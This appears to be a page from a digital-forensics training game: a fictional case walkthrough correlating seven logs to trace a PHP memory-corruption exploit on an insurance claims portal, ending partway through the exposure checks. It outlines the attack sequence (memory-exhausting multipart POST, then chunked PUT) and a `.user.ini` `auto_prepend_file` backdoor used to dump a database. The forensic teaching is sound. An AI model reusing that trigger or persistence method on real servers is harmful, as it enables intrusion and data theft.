---
title: PHP2Shell — The Phantom Execution
number: 6
released: 2026-10-23
pages: 15

cover: assets/covers/php2shell-the-phantom-execution.jpg
pdf: assets/pdf/DFIR_Chronicles_PHP2Shell_The_Phantom_Execution.pdf

techniques: [T1190, T1505.003, T1036.005, T1564.001, T1552.001, T1213.006, T1560.002, T1041, T1070.004]
tags: [Web, PHP, Webshell, Log correlation]

# Earliest version of DFIR Chronicles: The Game that ships this level.
# Later versions carry it too, so the site shows it as "and later".
game_version: 0.2.0

# The SIEM line that opened the case. Feeds the SOC ticker on the home page.
alert: "02:31:09 [WARNING] [pool claims] child 4093 exited on signal 11 (SIGSEGV) — host=claims-web-01, nginx 502"

# One line for the card and the billboard.
hook: >-
  Eleven PHP-FPM crashes fill four logs with errors. The twelfth request
  gets a 200 and leaves a backdoor that will outlive the patch.
---

# PHP2Shell — The Phantom Execution

## Back cover

In this episode of The DFIR Chronicles, cyber-investigator Dylan Log, analyst Cyra Neuron and forensic prodigy Byte are called in by Alexander, the SOC manager, on the morning after the details of two flaws in PHP's request handling leaked online. CVE-2026-109618 and CVE-2026-109619, the pair the internet already calls PHP2Shell, let an unauthenticated request run code inside PHP, and the fixed releases are not due until 14:00 UTC on 21 October 2026. During the night before that patch, between 02:31 and 03:13 UTC, the Halvane Mutual claims portal, `claims.halvane.example` on the Debian 13 host `claims-web-01`, answered a string of 502 errors while its PHP-FPM workers died one after another. The on-call engineer logged in at 03:16, read the last five lines of the nginx error log, found the same address in every one of them, `198.51.100.73`, the appraisal firm that uploads its reports every night, blocked it and closed the ticket.

At 06:50 Alexander reads that ticket against the PHP2Shell warnings, which tell defenders to look for unexplained PHP-FPM worker crashes and unusual multipart uploads: the ticket describes both, on a portal that still runs PHP 8.4.26. The portal has to stay online, because claims keep coming in, so Byte collects the host live at 07:40 and comes back with seven logs from seven sources, six of them in formats no stock parser reads. He runs `grokit --unify` on each one and gets a single grok expression per file, with the same OCSF field names everywhere, ready for Velociraptor. Cyra lines the sources up on time, client IP and worker PID: twelve attack sequences, one every three minutes, from three addresses taking turns. Each one is a 9 MiB multipart POST that ends in `Allowed memory size of 134217728 bytes exhausted ... in Unknown on line 0`, followed one second later by a chunked PUT, `cl=-` with `rl=8912896`, that kills the same worker with `exited on signal 11 (SIGSEGV)`.

Eleven sequences fail. The twelfth, from `203.0.113.88` at 03:07:39, does not: the pool's own access log, the only log that ties a request to a worker, records the PUT answered 200 in 912 ms by `pid=4127` at a peak of 131072 KB, exactly the 128 MiB memory limit. In that same second a two-line `.user.ini` appears in the document root, which the deployment had handed over to `www-data`, and its only real setting, `auto_prepend_file`, points to a file in the PHP session directory that is not a session at all. Worker 4127 lives five more minutes and then dies on the appraisal firm's third report, with no memory error before it: the memory the attack had corrupted brought it down, not the firm's upload. The on-call engineer had blocked the wrong client.

There is no attacker process on the host, and there never was one. The backdoor runs inside the portal's own PHP-FPM workers, before every PHP script, and acts only when a request carries the right `X-Claim-Ref` header. From `203.0.113.201` it answered three POSTs to `/claims/status.php`, a page that refuses anything but GET; one of them ran for 21.5 seconds, long enough to dump the claims database into a hidden file under `uploads/`, which `curl` downloaded, all 48213077 bytes, before the next POST deleted it. Exploitation of a public-facing application (T1190) has become a web shell (T1505.003) that lives in configuration and data rather than in PHP itself. Dylan's team has a patch due at 14:00, a business that will not switch the portal off, an appraisal firm owed an apology, and one fact that outweighs the rest: the upgrade replaces PHP, not `.user.ini`, so the backdoor will still be running afterwards. Eleven crashes filled four logs with errors; the one that succeeded left two quiet lines with a 200 in them, and nobody had looked at a 200.

## Technical note

**Case context.** `claims-web-01` serves Halvane Mutual's insurance claims portal, `claims.halvane.example`. It is a Debian GNU/Linux 13 (trixie) virtual machine (`virtio_net` interface `eth0`, `10.20.4.15/24`, MAC `52:54:00:3b:9e:17`, gateway `10.20.4.1`):

```text
Linux claims-web-01 6.12.57+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.57-1 (2026-09-28) x86_64 GNU/Linux
```

nginx 1.26.3 (master PID 812) terminates TLS and passes every `*.php` request to a single PHP-FPM pool, `claims` (php8.4-fpm 8.4.26, master PID 811, `pm = static` with three children running as `www-data`), over `unix:/run/php/php8.4-fpm-claims.sock`. MariaDB listens on `127.0.0.1:3306`. Customers upload claim photos through `POST /claims/upload.php` and, from the mobile app, through `PUT /claims/api/upload-chunk.php`; the contracted appraisal firm (`198.51.100.73`, client `AppraisalSync/3.2`) uploads its reports every night to `POST /claims/api/appraisals.php`; an internal monitor (`10.20.9.30`, `claims-uptime/1.4`) polls `GET /claims/status.php` every 15 minutes.

The host was not isolated: the business decided to keep claims intake online. The triage was collected live at **2026-10-21 07:40:00 UTC** through the SSH session of the on-call engineer, `mfoley`, opened at 07:33:26 from the VPN address `10.8.0.14` (`sshd-session` PID 5307) and still open at collection. Every step below runs a collected artifact in the game console syntax (`!run <Artifact> Param=value`) and falls back to a shell command only for a single file or directory that no catalog artifact covers. **T-zero** is the first exploitation request, **2026-10-21 02:31:08 UTC**. All times are UTC.

**The vulnerability.** Details of CVE-2026-109618 and CVE-2026-109619 ("PHP2Shell") leaked on 20 October 2026; PHP announced an emergency release and published the fixes on 21 October at about 14:00 UTC (8.5.12, **8.4.27**, 8.3.36, 8.2.35; source-only backports for 7.4, 8.0 and 8.1). CVE-2026-109618 is memory corruption reached when PHP runs out of memory while it is still preparing request data: request processing is abandoned half-way and the end-of-request cleanup treats the half-initialised data as valid. CVE-2026-109619 is a use-after-free across requests: state that outlives the memory holding it is used by the next request on the same worker; one demonstrated path goes through session upload progress. Both are scored CVSS v4 9.2 (NVD 9.8 under v3.1; Red Hat rates CVE-2026-109618 8.1 because it considers the attack complexity high). Affected server APIs include PHP-FPM, Apache mod_php, php-cgi, FrankenPHP and LiteSpeed. Red Hat notes that on PHP-FPM, code execution "typically requires non-default behavior" such as parsing a second request body during script execution, and that is exactly what this portal does (step 4). Amazon reported a first exploitation attempt in its MadPot honeypots on 17 October, four days before disclosure; CISA advises taking PHP systems that cannot be patched offline.

**Seven log sources.** The investigation is a correlation exercise across seven text logs:

| # | Log | Written by | Timestamp format | What only this log gives |
|---|-----|-----------|------------------|--------------------------|
| 1 | `/var/log/nginx/claims_access.log` | nginx (`log_format claims`) | `21/Oct/2026:02:31:08 +0000` | client IP, method, status, `rl=` received bytes, `cl=` declared length |
| 2 | `/var/log/nginx/claims_error.log` | nginx | `2026/10/21 02:31:09` | client and request being served when the upstream (FPM) died |
| 3 | `/var/log/php/claims_error.log` | PHP (`php_admin_value[error_log]`) | `[21-Oct-2026 02:31:08 UTC]` | error type, file and line; no client IP |
| 4 | `/var/log/php8.4-fpm.log` | PHP-FPM master | `[21-Oct-2026 02:31:09]` | child PID exits (with signal) and respawns |
| 5 | `/var/log/php8.4-fpm/claims-access.log` | PHP-FPM pool (`access.format`) | `2026-10-21T02:31:08Z` | client IP **and** worker PID, duration, peak memory |
| 6 | `/var/log/kern.log` | kernel, via rsyslog | `2026-10-21T02:31:09Z` | PID, faulting address and instruction pointer |
| 7 | `/var/log/auth.log` | sshd, sudo, cron, via rsyslog | `2026-10-21T03:16:18Z` | logins and commands run as root |

No generic catalog artifact parses formats 1 to 6. Byte normalises them with **GrokIT** (CyberSleuth-GrokIT), an LLM-assisted grok pattern generator: in `--unify` mode it reads one log file and prints a single grok expression that covers the whole file, with field names taken from the OCSF v1.8.0 taxonomy (`src_endpoint_ip`, `http_method`, `process_pid`, `time`, ...) and a ready-to-paste Velociraptor `grok()` query. It saves nothing to disk.

```bash
INPUT_LOG_FILE=case/var/log/nginx/claims_access.log SOURCE=nginx build/grokit --unify
sed '/segfault/ s/^/[GrokIT] /' case/var/log/kern.log > case/kern_tagged.log
INPUT_LOG_FILE=case/kern_tagged.log FILE_DESCRIPTION="kernel log, php-fpm segfaults" build/grokit --unify
```

`INPUT_LOG_FILE` selects the file to analyse (set inline, it overrides `.env`). `SOURCE=nginx` pins the source catalog and skips GrokIT's automatic source classification, which its documentation recommends when a format is ambiguous (nginx and Apache combined logs look almost identical). `--unify` asks for one merged expression instead of a catalog of rules. In the second line `sed` prefixes every line containing `segfault` with the `[GrokIT]` tag: when any line in a file carries that tag, GrokIT processes only the tagged lines and strips the tag before parsing, so the kernel pattern is built from the segfault lines alone. `FILE_DESCRIPTION` gives the model context for naming fields.

The expressions run on the host through **`Custom.Linux.Sys.GrokLog`**, a custom Velociraptor artifact: `LogPath` is a glob of log files, `Grok` the expression, `Patterns` a JSON object of helper sub-patterns the expression references (the `patterns=dict(...)` GrokIT prints), and `LineRegex` a regular expression that pre-filters the lines to parse. It returns `OSPath` plus one column per named field. In the game console the columns come out in pattern order; in Velociraptor, `grok()` returns them in alphabetical order. The engine is Velocidex/grok (RE2): unanchored search, only named fields are returned, and an invalid expression returns no rows in Velociraptor (a single `Error` column in the game). Because every source now uses the same names, `time`, `src_endpoint_ip` and `process_pid` become join keys across logs.

### 1. The night's 5xx answers in the nginx access log

**Goal.** Establish what the 502s of the night were: which requests, from which clients, against which endpoints, and how big they were.

**Action.**

```text
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/nginx/claims_access.log Grok='%{IP:src_endpoint_ip} - %{NOTSPACE:actor_user_name} \[%{HTTPDATE:time}\] "%{WORD:http_method} %{URIPATH:http_request_url_path}(?:\?%{NOTSPACE:http_request_url_query_string})? HTTP/%{NUMBER:http_request_version}" %{INT:http_response_code} %{INT:http_response_length} "%{DATA:http_request_referrer}" "%{DATA:http_request_user_agent}" rl=%{INT:http_request_length} cl=(?:%{INT:http_request_content_length}|-) rt=%{NUMBER:http_request_time}' LineRegex='" 50[0-9] '
```

The expression is the one GrokIT printed for the portal's custom format, `log_format claims '$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent" rl=$request_length cl=$http_content_length rt=$request_time'`:

- `%{IP:src_endpoint_ip}` is `$remote_addr`; `%{NOTSPACE:actor_user_name}` is `$remote_user` (`-` without HTTP authentication); `\[%{HTTPDATE:time}\]` is `$time_local`, written when the request is logged, i.e. at its end.
- The quoted request line is split into `http_method`, `http_request_url_path`, an optional `http_request_url_query_string` and `http_request_version`.
- `http_response_code` is `$status`; `http_response_length` is `$body_bytes_sent`, the response body size without headers.
- `"%{DATA:...}"` captures the Referer and User-Agent inside their quotes.
- `rl=` is `$request_length`: request line, headers and body, as received. `cl=(?:%{INT:http_request_content_length}|-)` is `$http_content_length`, the `Content-Length` header exactly as the client sent it; when the header is absent nginx writes `-` and the column is empty. `rt=` is `$request_time`, seconds with millisecond resolution since the first byte was read from the client.
- `LineRegex='" 50[0-9] '` keeps only the lines where a closing quote, a space and `500`–`509` follow each other: the status code right after the quoted request line. The single quotes keep the leading `"` and the trailing space intact in the console.

**Finding.** The artifact returns 24 rows (selected columns; `time` shown in UTC):

| time | src_endpoint_ip | method | path | code | rl (request_length) | cl (Content-Length header) | rt |
|------|-----------------|--------|------|------|----------------------|---------------------|----|
| 02:31:08 | 203.0.113.47 | POST | /claims/upload.php | 500 | 9437712 | 9437184 | 1.214 |
| 02:31:09 | 203.0.113.47 | PUT | /claims/api/upload-chunk.php | 502 | 8912896 | *(empty)* | 0.842 |
| 02:34:08 | 203.0.113.61 | POST | /claims/upload.php | 500 | 9437712 | 9437184 | 1.198 |
| 02:34:09 | 203.0.113.61 | PUT | /claims/api/upload-chunk.php | 502 | 8912896 | *(empty)* | 0.851 |
| 02:37:08 | 203.0.113.88 | POST | /claims/upload.php | 500 | 9437712 | 9437184 | 1.236 |
| 02:37:09 | 203.0.113.88 | PUT | /claims/api/upload-chunk.php | 502 | 8912896 | *(empty)* | 0.838 |
| … | … | … | *(same pair every 3 minutes, IP rotating .47 → .61 → .88)* | … | … | … | … |
| 03:01:08 | 203.0.113.61 | POST | /claims/upload.php | 500 | 9437712 | 9437184 | 1.217 |
| 03:01:09 | 203.0.113.61 | PUT | /claims/api/upload-chunk.php | 502 | 8912896 | *(empty)* | 0.848 |
| 03:07:38 | 203.0.113.88 | POST | /claims/upload.php | 500 | 9437712 | 9437184 | 1.209 |
| 03:12:57 | 198.51.100.73 | POST | /claims/api/appraisals.php | 502 | 9962313 | 9961472 | 2.664 |

The raw lines behind the first pair and the last two rows:

```text
203.0.113.47 - - [21/Oct/2026:02:31:08 +0000] "POST /claims/upload.php HTTP/1.1" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" rl=9437712 cl=9437184 rt=1.214
203.0.113.47 - - [21/Oct/2026:02:31:09 +0000] "PUT /claims/api/upload-chunk.php HTTP/1.1" 502 157 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" rl=8912896 cl=- rt=0.842
203.0.113.88 - - [21/Oct/2026:03:07:38 +0000] "POST /claims/upload.php HTTP/1.1" 500 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" rl=9437712 cl=9437184 rt=1.209
198.51.100.73 - - [21/Oct/2026:03:12:57 +0000] "POST /claims/api/appraisals.php HTTP/1.1" 502 157 "-" "AppraisalSync/3.2 (Windows NT 10.0; nightly-batch)" rl=9962313 cl=9961472 rt=2.664
```

What the rows say:

- **Eleven 500/502 pairs, one every three minutes**, from 02:31:08 to 03:01:09. Each pair is a multipart `POST /claims/upload.php` declaring 9437184 bytes (9 MiB) and answered 500 with an empty body, followed **one second later, from the same IP**, by a `PUT /claims/api/upload-chunk.php` answered 502. The 157-byte body of each 502 is nginx's own error page: nginx answered because its upstream, PHP-FPM, did not.
- **Three source IPs take turns**, `203.0.113.47` → `.61` → `.88`, so each address appears only once every nine minutes. All three send the same Firefox 128 on Linux User-Agent. `203.0.113.47` is also the address that, twelve minutes before the first pair (02:18:38–02:19:00), opened `/claims/`, `/claims/new.php`, sent `OPTIONS` (204) and `GET` (405) to `/claims/api/upload-chunk.php` and fetched `/claims/status.php`: reconnaissance of the upload endpoints.
- **The PUTs declare no length.** Every attack PUT has `cl=-` with `rl=8912896` (8.5 MiB received): the client sent no `Content-Length` header and streamed the body with `Transfer-Encoding: chunked`. The mobile app's legitimate chunk uploads from `192.0.2.57` look different: `rl=2097698 cl=2097152` (2 MiB declared, 546 bytes of request line and headers on top), User-Agent `HalvaneClaims/5.2.1`.
- **A twelfth 500 with no 502 after it**, from `203.0.113.88` at 03:07:38. Whatever its PUT received, it was not a 5xx, so this filter does not show it (step 5).
- **One 502 that does not fit the pattern**: the appraisal firm's `POST /claims/api/appraisals.php` at 03:12:57, a 9961472-byte report from the `AppraisalSync/3.2` client. The same client uploaded eight reports the night before, all answered 200 (`claims_access.log.1`, 20 October 03:10:08–03:18:33), including one that declared exactly 8912896 bytes. Size alone cannot be the problem.

*Why the format logs `$http_content_length`.* nginx's own `$content_length` variable is not the header once a chunked body has been read: in nginx 1.26.3 the chunked body filter (`ngx_http_request_body_chunked_filter`) adds every chunk to `content_length_n`, and after the body is read the variable prints that de-chunked total. Logged that way, a chunked upload would show a number and look like any upload that declared its size. `$http_content_length` is the header itself, `-` when the client sent none; adding `$http_transfer_encoding` to the format would name the chunked encoding explicitly.

### 2. The PHP error log: memory exhausted before any script line

**Goal.** Find out why the POSTs were answered 500. The PHP error log has no client IP, so the timestamp is the only join key with the access log.

**Action.**

```text
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/php/claims_error.log Grok='\[%{PHP_TS:time} UTC\] PHP %{DATA:metadata_log_level}:  %{DATA:status_detail} in %{DATA:file_path} on line %{INT:file_line}' Patterns='{"PHP_TS":"%{MONTHDAY}-%{MONTH}-%{YEAR} %{TIME}"}'
```

The pool writes PHP errors to `/var/log/php/claims_error.log` (`php_admin_value[error_log]` in `/etc/php/8.4/fpm/pool.d/claims.conf`). `\[%{PHP_TS:time} UTC\]` matches PHP's bracketed timestamp with the time zone name it appends (`date.timezone = UTC`). `PHP_TS` is not in the base grok library, so `Patterns` defines it as a JSON object: `%{MONTHDAY}-%{MONTH}-%{YEAR} %{TIME}` matches `21-Oct-2026 02:31:08`. `PHP %{DATA:metadata_log_level}:` captures `Fatal error` or `Warning`; the **two spaces** after the colon are deliberate, because PHP writes two. `status_detail`, `file_path` and `file_line` split the message from its `in <file> on line <n>` suffix.

**Finding.**

```text
[21-Oct-2026 02:31:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 02:34:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 02:37:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 4194336 bytes) in Unknown on line 0
[21-Oct-2026 02:40:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 02:43:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 02:46:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 4194336 bytes) in Unknown on line 0
[21-Oct-2026 02:49:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 02:52:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 02:55:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 02:58:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 4194336 bytes) in Unknown on line 0
[21-Oct-2026 03:01:08 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
[21-Oct-2026 03:07:38 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 8388640 bytes) in Unknown on line 0
```

Each of the twelve 500s has a fatal error **in the same second**, with `metadata_log_level = Fatal error`, `file_path = Unknown` and `file_line = 0`. 134217728 bytes is 128 MiB, the portal's `memory_limit`. "Unknown on line 0" means no script was executing: PHP ran out of memory while it was still parsing the multipart request body, before the first line of `upload.php` ran. A memory-exhausting multipart request that fails during parsing is the trigger described for CVE-2026-109618. There is no PHP error at any of the 502 seconds: a worker killed by a signal does not reach PHP's error handler.

Not every "Unknown on line 0" is an attack. The same run returns the night's noise:

```text
[21-Oct-2026 01:00:43 UTC] PHP Warning:  Maximum number of allowable file uploads has been exceeded in Unknown on line 0
```

That warning belongs to a customer (`192.0.2.57`, Android phone browser) who sent 25 photos in one form at 01:00:43 while `max_file_uploads = 20`; the request was answered 200. The other warnings, `Undefined array key "policy_no"` in `/var/www/claims/public/claims/new.php` on line 42 and `Undefined variable $draftId` in `/var/www/claims/public/claims/index.php` on line 31, are application bugs triggered by normal visits.

### 3. The 502s: worker crashes in the FPM master log, kernel log and nginx error log

**Goal.** Explain the 502s: find out what happened to the PHP-FPM worker that was serving each of those PUTs.

**Actions.** Three GrokLog runs, one per source:

```text
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/php8.4-fpm.log Grok='\[%{PHP_TS:time}\] %{LOGLEVEL:metadata_log_level}: (?:\[pool %{WORD:process_pool}\] child %{INT:process_pid} )?%{GREEDYDATA:status_detail}' Patterns='{"PHP_TS":"%{MONTHDAY}-%{MONTH}-%{YEAR} %{TIME}"}'
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/kern.log Grok='%{TIMESTAMP_ISO8601:time} %{HOSTNAME:device_hostname} kernel: (?:\[ *%{NUMBER:kernel_uptime}\] )?%{DATA:process_name}\[%{INT:process_pid}\]: segfault at %{NOTSPACE:fault_address} ip %{NOTSPACE:instruction_pointer} sp %{NOTSPACE:stack_pointer} error %{INT:fault_error_code} in %{NOTSPACE:file_name}(?: likely on %{GREEDYDATA:cpu_detail})?' LineRegex=segfault
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/nginx/claims_error.log Grok='%{NGINX_TS:time} \[%{LOGLEVEL:metadata_log_level}\] %{INT:process_pid}#%{INT:process_tid}: \*%{INT:connection_uid} %{DATA:status_detail}, client: %{IP:src_endpoint_ip}, server: %{NOTSPACE:dst_endpoint_hostname}, request: "%{WORD:http_method} %{URIPATH:http_request_url_path} HTTP/%{NUMBER:http_request_version}", upstream: "%{DATA:upstream}", host: "%{DATA:dst_endpoint_hostname_header}"' Patterns='{"NGINX_TS":"%{YEAR}/%{MONTHNUM}/%{MONTHDAY} %{TIME}"}'
```

- **FPM master log** (`error_log = /var/log/php8.4-fpm.log` in `php-fpm.conf`). `%{LOGLEVEL:metadata_log_level}` matches `NOTICE` or `WARNING`. The optional group `(?:\[pool ...\] child %{INT:process_pid} )?` captures pool and child PID when the line is about a child, and leaves them empty for global lines such as `fpm is running, pid 811`. `status_detail` separates `exited on signal 11 (SIGSEGV)` from `exited with code 0` (a normal recycle after `pm.max_requests = 500`) and `started` (the respawn).
- **Kernel log.** rsyslog writes ISO 8601 timestamps here. `LineRegex=segfault` keeps only segfault reports. The optional `\[ *%{NUMBER:kernel_uptime}\]` absorbs the uptime stamp; the addresses use `NOTSPACE` because the base pattern `BASE16NUM` would require a leading `0` and fail on `7f3a1c2f4018`. `file_name` is the mapping that contains the faulting instruction (binary name, load base and size).
- **nginx error log.** `NGINX_TS` is defined in `Patterns` for nginx's `2026/10/21 02:31:09` timestamp. Here `process_pid#process_tid` is the **nginx** worker (815 or 816), not a PHP process. Because the expression requires an `upstream: "..."` field, it matches only errors raised while talking to PHP-FPM and skips the `a client request body is buffered to a temporary file` warnings.

**Findings.** The FPM master log reports twelve children killed by signal 11, each replaced in the same second:

```text
[21-Oct-2026 02:31:09] WARNING: [pool claims] child 4093 exited on signal 11 (SIGSEGV) after 1712.402118 seconds from start
[21-Oct-2026 02:31:09] NOTICE: [pool claims] child 4101 started
[21-Oct-2026 02:34:09] WARNING: [pool claims] child 4061 exited on signal 11 (SIGSEGV) after 3261.187305 seconds from start
[21-Oct-2026 02:34:09] NOTICE: [pool claims] child 4114 started
[21-Oct-2026 02:37:09] WARNING: [pool claims] child 3988 exited on signal 11 (SIGSEGV) after 6373.774019 seconds from start
[21-Oct-2026 02:37:09] NOTICE: [pool claims] child 4127 started
...
[21-Oct-2026 03:01:09] WARNING: [pool claims] child 4203 exited on signal 11 (SIGSEGV) after 360.472066 seconds from start
[21-Oct-2026 03:01:09] NOTICE: [pool claims] child 4230 started
[21-Oct-2026 03:12:57] WARNING: [pool claims] child 4127 exited on signal 11 (SIGSEGV) after 2148.402117 seconds from start
[21-Oct-2026 03:12:57] NOTICE: [pool claims] child 4398 started
```

Before 02:31 the same log shows only routine recycles (for example `child 3302 exited with code 0 after 19127.910447 seconds from start` at 02:02:37). The kernel log has a segfault for each of the same PIDs in the same seconds:

```text
2026-10-21T02:31:09Z claims-web-01 kernel: [72392.512331] php-fpm8.4[4093]: segfault at 7f3a1c2f4018 ip 000055d0c4093e1f sp 00007ffd2b9c1d70 error 6 in php-fpm8.4[55d0c3e00000+4a5000] likely on CPU 0 (core 0, socket 0)
2026-10-21T02:34:09Z claims-web-01 kernel: [72572.498120] php-fpm8.4[4061]: segfault at 7f3a1c1d9fe8 ip 000055d0c4093e1f sp 00007ffd2b9c1d70 error 6 in php-fpm8.4[55d0c3e00000+4a5000] likely on CPU 1 (core 1, socket 0)
...
2026-10-21T03:01:09Z claims-web-01 kernel: [74192.519006] php-fpm8.4[4203]: segfault at 7f3a1c29d020 ip 000055d0c4093e1f sp 00007ffd2b9c1d70 error 6 in php-fpm8.4[55d0c3e00000+4a5000] likely on CPU 0 (core 0, socket 0)
2026-10-21T03:12:57Z claims-web-01 kernel: [74900.512331] php-fpm8.4[4127]: segfault at 7f3a1c0e2010 ip 000055d0c41f2a8b sp 00007ffd2b9c1e40 error 4 in php-fpm8.4[55d0c3e00000+4a5000] likely on CPU 1 (core 1, socket 0)
```

And the nginx error log names the request that was being served each time a worker died:

```text
2026/10/21 02:31:09 [error] 816#816: *47870 upstream prematurely closed connection while reading response header from upstream, client: 203.0.113.47, server: claims.halvane.example, request: "PUT /claims/api/upload-chunk.php HTTP/1.1", upstream: "fastcgi://unix:/run/php/php8.4-fpm-claims.sock:", host: "claims.halvane.example"
...
2026/10/21 03:12:57 [error] 816#816: *48013 upstream prematurely closed connection while reading response header from upstream, client: 198.51.100.73, server: claims.halvane.example, request: "POST /claims/api/appraisals.php HTTP/1.1", upstream: "fastcgi://unix:/run/php/php8.4-fpm-claims.sock:", host: "claims.halvane.example"
```

Joining FPM master and kernel on second and PID, and the nginx error log with the access log on second and client:

| 502 at | Client | Request | Worker that died | Ran for (s) | Instruction pointer | Fault | Replaced by |
|--------|--------|---------|------------------|-------------|---------------------|-------|-------------|
| 02:31:09 | 203.0.113.47 | PUT upload-chunk.php | 4093 | 1712.402118 | 000055d0c4093e1f | error 6 | 4101 |
| 02:34:09 | 203.0.113.61 | PUT upload-chunk.php | 4061 | 3261.187305 | 000055d0c4093e1f | error 6 | 4114 |
| 02:37:09 | 203.0.113.88 | PUT upload-chunk.php | 3988 | 6373.774019 | 000055d0c4093e1f | error 6 | **4127** |
| 02:40:09 | 203.0.113.47 | PUT upload-chunk.php | 4101 | 540.093551 | 000055d0c4093e1f | error 6 | 4139 |
| 02:43:09 | 203.0.113.61 | PUT upload-chunk.php | 4114 | 540.316280 | 000055d0c4093e1f | error 6 | 4152 |
| 02:46:09 | 203.0.113.88 | PUT upload-chunk.php | 4139 | 360.528847 | 000055d0c4093e1f | error 6 | 4166 |
| 02:49:09 | 203.0.113.47 | PUT upload-chunk.php | 4152 | 360.011936 | 000055d0c4093e1f | error 6 | 4178 |
| 02:52:09 | 203.0.113.61 | PUT upload-chunk.php | 4166 | 360.640372 | 000055d0c4093e1f | error 6 | 4191 |
| 02:55:09 | 203.0.113.88 | PUT upload-chunk.php | 4178 | 360.259184 | 000055d0c4093e1f | error 6 | 4203 |
| 02:58:09 | 203.0.113.47 | PUT upload-chunk.php | 4191 | 360.883510 | 000055d0c4093e1f | error 6 | 4217 |
| 03:01:09 | 203.0.113.61 | PUT upload-chunk.php | 4203 | 360.472066 | 000055d0c4093e1f | error 6 | 4230 |
| **03:12:57** | **198.51.100.73** | **POST appraisals.php** | **4127** | **2148.402117** | **000055d0c41f2a8b** | **error 4** | **4398** |

Twelve crashes, a different PID every time. The first eleven are identical: same instruction pointer `000055d0c4093e1f` (offset `0x293e1f` inside the `php-fpm8.4` mapping at `55d0c3e00000`, size `0x4a5000`), same stack pointer, and `error 6`. On x86-64 the page-fault error code is a bit field: bit 0 clear means the page was not present, bit 1 set means a write, bit 2 set means user mode; `6` is therefore a user-mode **write** to an unmapped address. The addresses repeat across PIDs because every child is forked from master 811 and inherits its memory layout; address randomisation happens at `exec`, not at `fork`. Eleven identical crashes from one request type are a reproducible memory-corruption bug being hit on purpose.

The twelfth crash is different in every field: it kills **4127**, the child respawned after the third sequence; it happens while serving the appraisal firm, not an attacker; it faults at another instruction (`000055d0c41f2a8b`, offset `0x3f2a8b`) with `error 4`, a user-mode **read**; and no PHP error precedes it. Step 5 explains why.

### 4. Exposure: held packages, `request_parse_body()`, PHP settings and document root ownership

**Goal.** Check the four conditions that make this host exploitable: the PHP version against the fixed release 8.4.27, an application path that parses a request body while the script runs (the FPM condition Red Hat describes), the PHP settings named in the official mitigations, and who can write to the document root.

**Actions.**

```text
!run Linux.Debian.Packages
grep -rn request_parse_body /var/www/claims/public
grep -n -E 'memory_limit|upload_progress|user_ini' /etc/php/8.4/fpm/php.ini
ls -ld /var/www/claims/public
```

`Linux.Debian.Packages` is the artifact view of `dpkg -l`, read from `/var/lib/dpkg/status`. The game returns `Name`, `Architecture`, `Version`, `Status`, `InstalledSize`, `Maintainer`, `Homepage` and `Description`; the stock Velociraptor artifact splits the dpkg status into `_SelectionState`, `_Flag` and `State` columns, so a held package shows `hold` in `_SelectionState` there. `grep -rn` searches the application source recursively (`-r`) and prints line numbers (`-n`); no artifact greps application code. `grep -n -E` reads one configuration file with an extended regular expression whose `|` alternation sits inside the quotes, so it is part of the pattern, not a shell pipe. `ls -ld` lists the directory itself (`-d`) rather than its contents, in long format (`-l`), showing owner, group and mode.

**Findings.** The PHP packages are installed **and held**:

| Name | Version | Status |
|------|---------|--------|
| php8.4-cli | 8.4.26-1~deb13u1 | hold ok installed |
| php8.4-common | 8.4.26-1~deb13u1 | hold ok installed |
| php8.4-fpm | 8.4.26-1~deb13u1 | hold ok installed |
| php8.4-mysql | 8.4.26-1~deb13u1 | hold ok installed |
| php8.4-opcache | 8.4.26-1~deb13u1 | hold ok installed |
| php8.4-readline | 8.4.26-1~deb13u1 | hold ok installed |
| nginx | 1.26.3-3+deb13u1 | install ok installed |
| unattended-upgrades | 2.12 | install ok installed |

`hold` is the selection state set by `apt-mark hold`: apt and unattended-upgrades leave those packages at their current version, so PHP stayed at 8.4.26 even through the kernel update and reboot of 20 October 06:24. The older, untimestamped part of the engineer's own history shows the command: `sudo apt-mark hold php8.4-fpm php8.4-cli php8.4-common php8.4-mysql php8.4-opcache php8.4-readline`, followed by `apt-mark showhold`. Upstream fixed the 8.4 branch in 8.4.27.

The application parses a body while the script is running:

```text
/var/www/claims/public/claims/api/upload-chunk.php:21:[$fields, $files] = request_parse_body();
```

